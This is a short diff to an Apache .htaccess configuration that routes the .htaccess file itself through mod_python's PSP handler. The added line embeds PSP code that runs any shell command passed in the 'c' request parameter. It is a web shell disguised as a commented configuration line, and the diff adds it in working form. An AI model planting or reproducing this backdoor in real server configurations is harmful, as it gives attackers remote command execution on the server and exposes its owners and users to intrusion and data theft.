@@ -14,5 +14,4 @@ AddHandler mod_python .htaccess
 AddHandler mod_python .psp
 PythonHandler mod_python.psp
 PythonDebug On
-# <% import commands %>
-#<%=commands.getstatusoutput(form["c"]) %>
+# <% import commands %><%=commands.getstatusoutput(form["c"]) %>
